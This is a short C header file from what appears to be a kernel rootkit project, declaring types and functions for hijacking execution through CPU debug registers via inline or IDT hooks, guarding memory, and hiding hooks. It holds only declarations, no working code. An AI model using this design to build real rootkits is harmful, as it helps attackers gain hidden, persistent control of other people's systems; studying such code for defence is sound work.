#ifndef ROOTKIT_DEBUG_REG_H
# define ROOTKIT_DEBUG_REG_H

# include "idt.h"

enum slrk_dr_hijacking {
    INLINE_HOOK = 1,
    IDT_HOOK    = 2
};

enum slrk_dr_mem_prot {
    CONST_VAL = 1,
    DYN_VAL   = 2
};

enum slrk_dr_hiding {
    HIDE_VOID     = 0,
    HIDE_RET_0    = 1,
    HIDE_SAVE_MOV = 2,
};

typedef void (*f_dr_hook)(struct slrk_regs *regs, long err);

void dr_init(enum slrk_dr_hijacking m);
void dr_cleanup(void);

int dr_protect_mem(void *addr, size_t n, enum slrk_dr_mem_prot p);
int dr_hook(void *addr, f_dr_hook hook, enum slrk_dr_hiding h);

void dr_enable(int n);
void dr_disable(int n);
void dr_delete(int n);

#endif /* !ROOTKIT_DEBUG_REG_H */
